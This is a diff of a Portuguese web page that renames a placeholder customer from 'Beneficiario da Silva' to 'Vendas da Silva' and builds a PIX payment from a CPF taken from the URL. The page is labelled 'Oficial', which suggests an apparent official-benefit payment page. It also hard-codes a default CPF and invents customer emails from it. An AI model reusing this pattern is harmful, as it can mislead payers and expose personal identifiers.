@@ -47,7 +47,7 @@
         <span class="text-xs bg-blue-700/60 px-2 py-0.5 rounded text-blue-200 uppercase font-bold">Oficial</span>
       </div>
       <div class="text-right">
-        <div id="u-nome" class="text-xs font-bold text-slate-100">Benefici&aacute;rio</div>
+        <div id="u-nome" class="text-xs font-bold text-slate-100">Vendas</div>
         <div id="u-cpf" class="text-[11px] text-blue-300 font-mono">000.***.***-00</div>
       </div>
     </div>
@@ -174,9 +174,9 @@
     let urlParams = new URLSearchParams(window.location.search);
     let rawCpf = urlParams.get('cpf') || localStorage.getItem('userCPF') || '';
     let cpf = rawCpf.replace(/\D/g, '') || "07580365316";
-    let nome = (urlParams.get('nome') || localStorage.getItem('userName') || 'Beneficiario da Silva').trim();
+    let nome = (urlParams.get('nome') || localStorage.getItem('userName') || 'Vendas da Silva').trim();
 
-    if (nome && nome !== 'Beneficiario da Silva') {
+    if (nome && nome !== 'Vendas da Silva') {
       document.getElementById('u-nome').textContent = nome;
       try { localStorage.setItem('userName', nome); } catch(e){}
     }
@@ -197,7 +197,7 @@
         amount: 4392,
         paymentMethod: "PIX",
         customer: {
-          name: nome || "Beneficiario da Silva",
+          name: nome || "Vendas da Silva",
           email: "cliente" + cpf.slice(0,6) + "@email.com",
           document: {
             number: cpf,
